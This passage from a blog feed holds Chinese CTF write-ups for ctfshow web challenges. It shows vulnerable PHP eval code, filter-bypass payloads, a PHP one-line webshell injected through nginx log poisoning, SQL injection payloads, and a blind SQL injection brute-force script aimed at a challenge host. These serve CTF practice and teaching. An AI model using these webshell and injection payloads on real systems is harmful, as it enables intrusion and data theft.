class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>                <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"cmd error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>源码中通过 GET 请求获取参数，并过滤了参数中的  <code>system exec highlight cat ( . ; file php config</code>  等关键字，</p>\n<p>这里有几个比较重要的点</p>\n<ol>\n<li>过滤了括号  <code>( </code> , 函数不能用了，但仍然可以用反引号 ` 来执行系统命令</li>\n<li>过滤了分号 <code>；</code> , 可以使用 <code>?&gt;</code>  来代替分号，但这样一来就只能执行一行代码，增加了解题的难度</li>\n<li>源码中的过滤只针对 GET 请求的参数，并未对 POST 请求的参数做限制，可以利用这一点搞事情</li>\n</ol>\n<p>首先我们通过 GET 请求的参数传递一句话木马， <code>$_POST[a]</code>  接收 POST 请求传递的参数，而后反引号将接收的参数当做系统命令执行，由于反引号执行完成后并不输出结果，而是返回一个保存执行结果的字符串类型变量，所以需要使用  <code>echo</code>  来输出这个变量，从而输出执行结果</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?c&#x3D;echo &#96;$_POST[a]&#96;?&gt;</pre></td></tr></table></figure><p>而后使用代理工具 (Burp Suite) 抓包，在 POST 请求中传递需要执行的系统命令，这里需要注意两个地方 ( 如果使用的是其他工具可以忽略)</p>\n<ol>\n<li>拦截的请求是 GET 请求，需要改成 POST 请求才能在请求体中传递参数</li>\n<li>由于手动将 GET 请求改成了 POST 请求，需要再手动添加  <code>Content-Type: application/x-www-form-urlencoded</code>  , 否则将无法正常发送 POST 请求的参数  <code>a=cat config.php</code></li>\n</ol>\n<p>或者直接用 Hackbar</p>\n<h1 id=\"web-15\"><a class=\"anchor\" href=\"#web-15\">#</a> web 15</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># flag in config.php</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"config.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/system|\\\\*|\\?|\\&lt;|\\>|\\=|exec|highlight|cat|\\(|\\.|file|php|config/i\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>                <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"cmd error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?c&#x3D;echo $_GET[1];&amp;1&#x3D;tac config.php</pre></td></tr></table></figure><h1 id=\"web-16\"><a class=\"anchor\" href=\"#web-16\">#</a> web 16</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># flag in config.php</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"config.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"ctfshow<span class=\"token interpolation\"><span class=\"token variable\">$c</span></span>\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token string double-quoted-string\">\"a6f57ae38a22448c2f07f3f95f49c84e\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"nonono!\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>爆破</p>\n<p>代码为</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> hashlib</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>str1 <span class=\"token operator\">=</span> <span class=\"token string\">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> str1<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> str1<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">for</span> k <span class=\"token keyword\">in</span> str1<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            s <span class=\"token operator\">=</span> hashlib<span class=\"token punctuation\">.</span>md5<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'ctfshow'</span><span class=\"token operator\">+</span>i<span class=\"token operator\">+</span>j<span class=\"token operator\">+</span>k<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            <span class=\"token comment\"># print(type(s))</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token keyword\">if</span> s <span class=\"token operator\">==</span> <span class=\"token string\">'a6f57ae38a22448c2f07f3f95f49c84e'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">+</span>j<span class=\"token operator\">+</span>k<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"web-1718192021\"><a class=\"anchor\" href=\"#web-1718192021\">#</a> web 17/18/19/20/21</h1>\n<p>17</p>\n<p>18 过滤了 file</p>\n<p>19 过滤了 base</p>\n<p>20 过滤了 rot</p>\n<p>21 过滤了： c 传参过滤掉 php</p>\n<p>思路：</p>\n<p>include 文件包含</p>\n<p>利用日志文件包含，访问日志文件： <code>?c=/var/log/nginx/access.log</code></p>\n<p>发现日志文件记录了  <code>user-agent</code>  头，于是在该头中插入一句话木马： <code>&lt;?php eval($_POST['a']);?&gt;</code></p>\n<p>然后可使用蚁剑连接，密码即为  <code>a</code>  然后看到有  <code>36d.php</code> ，打开后得到 flag</p>\n",
            "tags": [
                "CTF",
                "ctfshow",
                "Web"
            ]
        },
        {
            "id": "http://dpm12345.github.io/2022/10/04/CTF/ctfshow/%E8%90%8C%E6%96%B0%E8%B5%9B/",
            "url": "http://dpm12345.github.io/2022/10/04/CTF/ctfshow/%E8%90%8C%E6%96%B0%E8%B5%9B/",
            "title": "萌新赛",
            "date_published": "2022-10-03T16:10:32.000Z",
            "content_html": "<h1 id=\"web\"><a class=\"anchor\" href=\"#web\">#</a> Web</h1>\n<h2 id=\"给他\"><a class=\"anchor\" href=\"#给他\">#</a> 给他</h2>\n<p>源码</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$pass</span><span class=\"token operator\">=</span><span class=\"token function\">sprintf</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"and pass='%s'\"</span><span class=\"token punctuation\">,</span><span class=\"token function\">addslashes</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pass'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token variable\">$sql</span><span class=\"token operator\">=</span><span class=\"token function\">sprintf</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"select * from user where name='%s' <span class=\"token interpolation\"><span class=\"token variable\">$pass</span></span>\"</span><span class=\"token punctuation\">,</span><span class=\"token function\">addslashes</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><img data-src=\"/%E7%B4%A0%E6%9D%90/ctfshow/%E8%90%8C%E6%96%B0%E8%B5%9B/web_%E7%BB%99%E4%BB%96.png\" alt=\"\" /></p>\n<p>payload:  <code>?name=admin&amp;pass=%1$' or 1=1--+</code></p>\n<p>这里修改的原因为，%1 的话连接到 sql 上时，%1 会被解析为空，那么 $‘成为新的变量，因而输出的 sql 为</p>\n<p><code>select * from user where name='admin' and pass='''</code></p>\n<p>那么此时如果在后面添加，比如  <code>or 1=1--+</code></p>\n<p>那么得到 sql 语句为 <code>'select * from user where name='admin' and pass='' or 1=1-- '</code> , 也就是成立</p>\n<p>之后得到一个假的 404 页面</p>\n<p>查看源码，可以看到 flag 的位置 /flag</p>\n<p>抓包，看见 cookie 里有 file=666c61672e747874，后面内容十六进制解码后为 flag.txt</p>\n<p>使用伪协议，base64，十六进制编码输入后，不行</p>\n<p>使用 rot13</p>\n<p>得到 <code>PGSFUBJ&#123;S3622181-0S53-494R-N344-7P6001S38SQ1&#125;</code></p>\n<p>得到后 rot13 解码，得到 flag</p>\n<h2 id=\"签到\"><a class=\"anchor\" href=\"#签到\">#</a> 签到</h2>\n<p>命令执行，不同命令间可用分号分隔，一条一条执行</p>\n<p><code>?url=a;ls;a</code></p>\n<p><code>?url=a;cat flag;a</code></p>\n<h2 id=\"假赛生\"><a class=\"anchor\" href=\"#假赛生\">#</a> 假赛生</h2>\n<p>根据题目，有 register.php 和 login.php</p>\n<p>由代码，需要 name=admin，于是注册 admin 的用户</p>\n<p>发现不能注册，于是在 admin 后加上空格，尝试使用 admin 登入，发现可以</p>\n<p>之后传入 c 的值，由正则 <code>\\w 匹配字母或数字或下划线或汉字</code></p>\n<p>可传入空值即可绕过</p>\n<p>得到 flag</p>\n<h2 id=\"萌新记忆\"><a class=\"anchor\" href=\"#萌新记忆\">#</a> 萌新记忆</h2>\n<p>进入 admin 目录，有登陆页面，</p>\n<p>抓包，测试，</p>\n<p>经过一番尝试在没有语句错误的情况下发现有三种返回结果</p>\n<ol>\n<li>用户名 / 密码错误：当输入的用户名不为 admin 且不超过限制的长度时</li>\n<li>用户名错误：用户名长度超过限制 (字符长度最大为 20)</li>\n<li>密码错误：输入用户名为 admin</li>\n<li>通过测试发现未过滤的字符有单引号 (’)、逗号（,）、括号（（））、小于号 (&lt;)、或（||）、substr ()、lift、right、length ()</li>\n</ol>\n<p>首先获取字段长度</p>\n<p><code>'||length(p)&lt;'100&amp;p=1</code></p>\n<p>当小于 18 返回<strong>密码错误</strong>，小于 17<strong> 返回用户名 / 密码错误</strong></p>\n<p>因此，密码字段长度为 17</p>\n<p>爆破</p>\n<p>脚本为</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">'http://912753e7-33da-4383-bd60-939a7885131d.challenge.ctf.show/admin/checklogin.php'</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>s <span class=\"token operator\">=</span> <span class=\"token string\">'0123456789abcdefghijklmnopqrstuvwxyz'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">18</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'*'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> s<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        data <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"u\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"'||substr(p,\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">\",1)&lt;'\"</span><span class=\"token operator\">+</span>j<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>                <span class=\"token string\">\"p\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"1\"</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        r <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token comment\"># print(r.text)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">\"密码错误\"</span> <span class=\"token operator\">==</span> r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            flag <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr></table></figure><p>得到密码 <code>cptbtptpbcptdtptp</code></p>\n<p>登录得到 flag</p>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        }
    ]
}